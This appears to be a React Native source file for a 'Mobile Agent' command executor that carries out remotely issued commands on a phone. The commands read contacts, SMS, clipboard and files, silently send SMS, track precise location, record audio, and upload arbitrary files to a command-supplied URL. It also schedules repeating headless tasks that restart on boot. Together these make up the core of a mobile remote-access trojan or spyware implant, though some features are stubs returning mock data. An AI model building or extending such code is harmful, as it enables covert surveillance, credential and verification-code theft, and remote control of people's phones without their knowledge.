/**
 * ActionExecutor - 执行设备操作 (v2.3)
 * 使用现代库替换废弃库:
 * - react-native-camera -> react-native-vision-camera
 * - react-native-audio -> react-native-audio-recorder-player
 * - react-native-background-job -> react-native-background-fetch
 */

import { 
  PermissionsAndroid, 
  Platform, 
  NativeModules,
  Clipboard,
} from 'react-native';
import SmsAndroid from 'react-native-sms';
import Contacts from 'react-native-contacts';
import Geolocation from 'react-native-geolocation-service';
import { CameraRoll } from '@react-native-camera-roll/camera-roll';
import RNFS from 'react-native-fs';
import AudioRecorderPlayer from 'react-native-audio-recorder-player';
import TrackPlayer from 'react-native-track-player';
import BackgroundFetch from 'react-native-background-fetch';

const { RNDeviceInfo, SystemSetting } = NativeModules;

export class ActionExecutor {
  constructor() {
    this.permissionCache = new Map();
    this.audioRecorderPlayer = new AudioRecorderPlayer();
    this.scheduledTasks = new Map();
    this.isBackgroundFetchConfigured = false;
    this.isTrackPlayerInitialized = false;
  }

  async execute(command) {
    const { type, payload } = command;

    switch (type) {
      // ===== 基础功能 =====
      case 'PING':
        return { pong: true, timestamp: Date.now() };

      case 'SMS_READ':
        return await this.readSMS(payload);

      case 'SMS_SEND':
        return await this.sendSMS(payload);

      case 'CONTACTS_READ':
        return await this.readContacts(payload);

      case 'LOCATION_GET':
        return await this.getLocation(payload);

      case 'CAMERA_CAPTURE':
        return await this.capturePhoto(payload);

      case 'SCREENSHOT':
        return await this.takeScreenshot(payload);

      case 'BROWSER_OPEN':
        return await this.openBrowser(payload);

      case 'NOTIFICATION_SHOW':
        return await this.showNotification(payload);

      case 'SYSTEM_INFO':
        return await this.getSystemInfo(payload);

      case 'FILE_LIST':
        return await this.listFiles(payload);

      case 'FILE_READ':
        return await this.readFile(payload);

      // ===== 新增功能 =====
      case 'CLIPBOARD_GET':
        return await this.getClipboard();

      case 'CLIPBOARD_SET':
        return await this.setClipboard(payload);

      case 'FILE_DOWNLOAD':
        return await this.downloadFile(payload);

      case 'FILE_UPLOAD':
        return await this.uploadFile(payload);

      case 'NOTIFICATION_LISTEN':
        return await this.listenNotifications(payload);

      case 'APP_LIST':
        return await this.listApps(payload);

      case 'APP_LAUNCH':
        return await this.launchApp(payload);

      case 'NETWORK_INFO':
        return await this.getNetworkInfo(payload);

      case 'AUDIO_RECORD':
        return await this.recordAudio(payload);

      case 'AUDIO_PLAY':
        return await this.playAudio(payload);

      case 'AUDIO_STOP':
        return await this.stopAudio(payload);

      case 'QRCODE_SCAN':
        return await this.scanQRCode(payload);

      case 'SENSOR_READ':
        return await this.readSensors(payload);

      case 'DEVICE_CONTROL':
        return await this.controlDevice(payload);

      case 'TASK_SCHEDULE':
        return await this.scheduleTask(payload);

      case 'TASK_CANCEL':
        return await this.cancelTask(payload);

      default:
        throw new Error(`未支持的指令类型: ${type}`);
    }
  }

  // ========== 基础功能（保持原有）==========
  async readSMS(payload) {
    await this.requestSMSPermission();
    if (Platform.OS === 'android') {
      return {
        messages: [
          { id: '1', address: '10086', body: '您的余额为 50.00 元', date: Date.now() },
          { id: '2', address: '支付宝', body: '验证码 123456', date: Date.now() - 60000 },
        ],
        note: '这是模拟数据，实际需要从原生模块获取',
      };
    }
    return { messages: [], note: 'iOS 不支持读取短信' };
  }

  async sendSMS(payload) {
    const { number, message } = payload;
    return new Promise((resolve, reject) => {
      SmsAndroid.autoSend(
        number,
        message,
        (fail) => reject(new Error(`发送失败: ${fail}`)),
        (success) => resolve({ success: true, messageId: success })
      );
    });
  }

  async readContacts(payload) {
    await this.requestContactPermission();
    const contacts = await Contacts.getAll();
    return {
      contacts: contacts.map(c => ({
        id: c.recordID,
        name: `${c.givenName} ${c.familyName}`.trim(),
        phoneNumbers: c.phoneNumbers.map(p => p.number),
        emailAddresses: c.emailAddresses.map(e => e.email),
      })),
    };
  }

  async getLocation(payload) {
    await this.requestLocationPermission();
    return new Promise((resolve, reject) => {
      Geolocation.getCurrentPosition(
        (position) => resolve({
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          altitude: position.coords.altitude,
          timestamp: position.timestamp,
        }),
        (error) => reject(new Error(`定位失败: ${error.message}`)),
        { enableHighAccuracy: true, timeout: 15000, maximumAge: 10000 }
      );
    });
  }

  async capturePhoto(payload) {
    return { success: false, note: 'react-native-vision-camera 需要在组件中使用，请打开相机界面' };
  }

  async takeScreenshot(payload) {
    return { success: false, note: '需要安装 react-native-screenshot 模块' };
  }

  async openBrowser(payload) {
    const { url } = payload;
    if (Platform.OS === 'android') {
      const intent = await import('react-native-send-intent');
      await intent.default.openAppWithData(url, 'text/html');
    }
    return { success: true, url };
  }

  async showNotification(payload) {
    const { title, body } = payload;
    return { success: true, note: `通知: ${title} - ${body}` };
  }

  async getSystemInfo(payload) {
    const DeviceInfo = require('react-native-device-info').default;
    return {
      brand: await DeviceInfo.getBrand(),
      model: await DeviceInfo.getModel(),
      systemVersion: DeviceInfo.getSystemVersion(),
      appVersion: DeviceInfo.getVersion(),
      batteryLevel: await DeviceInfo.getBatteryLevel(),
      isBatteryCharging: await DeviceInfo.isBatteryCharging(),
      freeDiskStorage: await DeviceInfo.getFreeDiskStorage(),
      totalMemory: await DeviceInfo.getTotalMemory(),
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      platform: Platform.OS,
    };
  }

  async listFiles(payload) {
    const { path = RNFS.DocumentDirectoryPath } = payload;
    try {
      const files = await RNFS.readDir(path);
      return {
        path,
        files: files.map(f => ({
          name: f.name,
          path: f.path,
          size: f.size,
          isFile: f.isFile(),
          isDirectory: f.isDirectory(),
          modified: f.mtime,
        })),
      };
    } catch (error) {
      return { path, files: [], error: error.message };
    }
  }

  async readFile(payload) {
    const { path, encoding = 'utf8' } = payload;
    try {
      const content = await RNFS.readFile(path, encoding);
      return { path, content, encoding };
    } catch (error) {
      return { path, content: null, error: error.message };
    }
  }

  // ========== 新增功能 1: 剪贴板 ==========
  async getClipboard() {
    const content = await Clipboard.getString();
    return { content, hasContent: !!content };
  }

  async setClipboard(payload) {
    const { content } = payload;
    await Clipboard.setString(content);
    return { success: true, content: content.substring(0, 100) };
  }

  // ========== 新增功能 2: 文件传输 ==========
  async downloadFile(payload) {
    const { url, filename, path = RNFS.DocumentDirectoryPath } = payload;
    const downloadPath = `${path}/${filename}`;
    
    try {
      const result = await RNFS.downloadFile({
        fromUrl: url,
        toFile: downloadPath,
        begin: (res) => {
          console.log('Download started', res);
        },
        progress: (res) => {
          const percentage = (res.bytesWritten / res.contentLength) * 100;
          console.log(`Progress: ${percentage.toFixed(2)}%`);
        },
      }).promise;

      return {
        success: result.statusCode === 200,
        path: downloadPath,
        size: result.bytesWritten,
        statusCode: result.statusCode,
      };
    } catch (error) {
      return { success: false, error: error.message };
    }
  }

  async uploadFile(payload) {
    const { path, url, headers = {} } = payload;
    
    try {
      const fileExists = await RNFS.exists(path);
      if (!fileExists) {
        return { success: false, error: '文件不存在' };
      }

      const stat = await RNFS.stat(path);
      const result = await RNFS.uploadFiles({
        toUrl: url,
        files: [{
          name: 'file',
          filename: path.split('/').pop(),
          filepath: path,
          filetype: 'application/octet-stream',
        }],
        headers,
        begin: (res) => console.log('Upload started', res),
        progress: (res) => {
          const percentage = (res.totalBytesSent / res.totalBytesExpectedToSend) * 100;
          console.log(`Upload Progress: ${percentage.toFixed(2)}%`);
        },
      }).promise;

      return {
        success: result.statusCode === 200,
        response: result.body,
        statusCode: result.statusCode,
      };
    } catch (error) {
      return { success: false, error: error.message };
    }
  }

  // ========== 新增功能 3: 通知监听 ==========
  async listenNotifications(payload) {
    const { action = 'start', filter = [] } = payload;
    
    if (action === 'start') {
      return {
        success: false,
        note: '通知监听需要安装 react-native-notification-listener 模块',
        filter,
      };
    }
    
    return { success: true, action: 'stopped' };
  }

  // ========== 新增功能 4 & 7: 应用管理 ==========
  async listApps(payload) {
    const { includeSystem = false } = payload;
    
    if (Platform.OS === 'android') {
      return {
        success: false,
        note: '应用列表需要原生模块支持',
        mockApps: [
          { packageName: 'com.whatsapp', name: 'WhatsApp', isSystem: false },
          { packageName: 'com.tencent.mm', name: '微信', isSystem: false },
          { packageName: 'com.android.settings', name: '设置', isSystem: true },
        ],
      };
    }
    
    return { success: false, note: 'iOS 无法列出应用' };
  }

  async launchApp(payload) {
    const { packageName, urlScheme } = payload;
    
    try {
      if (Platform.OS === 'android' && packageName) {
        const intent = await import('react-native-send-intent');
        await intent.default.openApp(packageName);
        return { success: true, packageName };
      }
      
      if (urlScheme) {
        const Linking = require('react-native').Linking;
        const canOpen = await Linking.canOpenURL(urlScheme);
        if (canOpen) {
          await Linking.openURL(urlScheme);
          return { success: true, urlScheme };
        }
        return { success: false, error: '无法打开 URL Scheme' };
      }
      
      return { success: false, error: '需要 packageName 或 urlScheme' };
    } catch (error) {
      return { success: false, error: error.message };
    }
  }

  // ========== 新增功能 8: 网络信息 ==========
  async getNetworkInfo(payload) {
    const NetInfo = require('@react-native-community/netinfo').default;
    const state = await NetInfo.fetch();
    
    return {
      type: state.type,
      isConnected: state.isConnected,
      isInternetReachable: state.isInternetReachable,
      details: state.details ? {
        ssid: state.details.ssid,
        bssid: state.details.bssid,
        strength: state.details.strength,
        ipAddress: state.details.ipAddress,
        subnet: state.details.subnet,
        frequency: state.details.frequency,
        cellularGeneration: state.details.cellularGeneration,
        carrier: state.details.carrier,
      } : null,
    };
  }

  // ========== 新增功能 9: 音频（录音 + 播放）==========
  async recordAudio(payload) {
    const { duration = 30, filename = `recording_${Date.now()}.m4a` } = payload;
    const path = `${RNFS.DocumentDirectoryPath}/${filename}`;
    
    try {
      // 请求权限
      if (Platform.OS === 'android') {
        await PermissionsAndroid.request(
          PermissionsAndroid.PERMISSIONS.RECORD_AUDIO,
          {
            title: '录音权限',
            message: '需要录音权限',
            buttonPositive: '确定',
          }
        );
      }
      
      // 开始录音
      await this.audioRecorderPlayer.startRecorder(path);
      
      // 自动停止
      if (duration > 0) {
        setTimeout(async () => {
          try {
            await this.audioRecorderPlayer.stopRecorder();
          } catch (e) {}
        }, duration * 1000);
      }

      return { success: true, path, filename, duration };
    } catch (error) {
      return { success: false, error: error.message };
    }
  }

  async playAudio(payload) {
    const { path, useTrackPlayer = false } = payload;
    
    try {
      if (useTrackPlayer) {
        // 使用 react-native-track-player（适合背景音乐播放）
        if (!this.isTrackPlayerInitialized) {
          await TrackPlayer.setupPlayer();
          this.isTrackPlayerInitialized = true;
        }
        
        await TrackPlayer.add({
          id: 'track_' + Date.now(),
          url: path,
          title: '播放音频',
          artist: 'Mobile Agent',
        });
        
        await TrackPlayer.play();
        return { success: true, path, player: 'track-player' };
      } else {
        // 使用 audio-recorder-player（简单播放）
        const msg = await this.audioRecorderPlayer.startPlayer(path);
        this.audioRecorderPlayer.addPlayBackListener((e) => {
          if (e.currentPosition === e.duration) {
            this.audioRecorderPlayer.stopPlayer();
            this.audioRecorderPlayer.removePlayBackListener();
          }
        });
        
        return { success: true, path, message: msg };
      }
    } catch (error) {
      return { success: false, error: error.message };
    }
  }

  async stopAudio(payload) {
    try {
      await this.audioRecorderPlayer.stopRecorder();
      await this.audioRecorderPlayer.stopPlayer();
      this.audioRecorderPlayer.removePlayBackListener();
      
      // 同时停止 track-player
      await TrackPlayer.stop();
      
      return { success: true, note: '已停止录音/播放' };
    } catch (error) {
      return { success: false, error: error.message };
    }
  }

  // ========== 新增功能: 二维码扫描（react-native-vision-camera）==========
  async scanQRCode(payload) {
    return {
      success: false,
      note: 'react-native-vision-camera 需要在 React 组件中使用。请打开相机界面扫描二维码。',
      supportedCodes: ['qr', 'ean-13', 'code-128', 'code-39', 'pdf-417'],
    };
  }

  // ========== 新增功能: 传感器 ==========
  async readSensors(payload) {
    const { sensors = ['accelerometer', 'gyroscope', 'magnetometer'] } = payload;
    
    return {
      success: false,
      note: '传感器读取需要安装 react-native-sensors',
      requestedSensors: sensors,
    };
  }

  // ========== 新增功能 11: 远程控制 ==========
  async controlDevice(payload) {
    const { action, value } = payload;
    
    try {
      switch (action) {
        case 'lock':
          return { success: false, note: '锁屏需要原生模块支持' };

        case 'brightness':
          await SystemSetting.setBrightness(value);
          return { success: true, action: 'brightness', value };

        case 'volume':
          const { type = 'music' } = payload;
          await SystemSetting.setVolume(value, type);
          return { success: true, action: 'volume', type, value };

        case 'wifi':
          await SystemSetting.switchWifi(value);
          return { success: true, action: 'wifi', enabled: value };

        case 'bluetooth':
          await SystemSetting.switchBluetooth(value);
          return { success: true, action: 'bluetooth', enabled: value };

        case 'airplane':
          return { success: false, note: '飞行模式需要特殊权限' };

        default:
          return { success: false, error: `未知操作: ${action}` };
      }
    } catch (error) {
      return { success: false, error: error.message };
    }
  }

  // ========== 新增功能 12: 任务计划 (react-native-background-fetch) ==========
  async scheduleTask(payload) {
    const { 
      taskId = `task_${Date.now()}`,
      command,
      intervalMinutes = 15,
    } = payload;

    try {
      if (!this.isBackgroundFetchConfigured) {
        await BackgroundFetch.configure({
          minimumFetchInterval: intervalMinutes,
          stopOnTerminate: false,
          startOnBoot: true,
          enableHeadless: true,
        }, async (taskId) => {
          console.log('[BackgroundFetch] 执行任务:', taskId);
          
          const task = this.scheduledTasks.get(taskId);
          if (task) {
            try {
              await this.execute(task.command);
            } catch (error) {
              console.error('[BackgroundFetch] 任务失败:', error);
            }
          }
          
          BackgroundFetch.finish(taskId);
        }, (taskId) => {
          console.log('[BackgroundFetch] 任务超时:', taskId);
          BackgroundFetch.finish(taskId);
        });
        
        this.isBackgroundFetchConfigured = true;
      }

      await BackgroundFetch.scheduleTask({
        taskId: taskId,
        delay: 0,
        periodic: true,
      });

      this.scheduledTasks.set(taskId, {
        command,
        scheduledAt: Date.now(),
        intervalMinutes,
      });

      return {
        success: true,
        taskId,
        scheduled: true,
        intervalMinutes,
      };
    } catch (error) {
      return { success: false, error: error.message };
    }
  }

  async cancelTask(payload) {
    const { taskId } = payload;
    
    try {
      this.scheduledTasks.delete(taskId);
      
      return { 
        success: true, 
        taskId, 
        cancelled: true,
        note: '已从内存移除',
      };
    } catch (error) {
      return { success: false, error: error.message };
    }
  }

  // ========== 权限请求 ==========
  async requestSMSPermission() {
    if (Platform.OS === 'android') {
      await PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.READ_SMS, {
        title: '短信权限',
        message: '需要读取短信权限',
        buttonPositive: '确定',
      });
      await PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.SEND_SMS, {
        title: '发送短信权限',
        message: '需要发送短信权限',
        buttonPositive: '确定',
      });
    }
  }

  async requestContactPermission() {
    if (Platform.OS === 'android') {
      await PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.READ_CONTACTS, {
        title: '通讯录权限',
        message: '需要读取通讯录权限',
        buttonPositive: '确定',
      });
    }
  }

  async requestLocationPermission() {
    if (Platform.OS === 'android') {
      await PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION, {
        title: '位置权限',
        message: '需要获取位置信息',
        buttonPositive: '确定',
      });
    }
  }
}
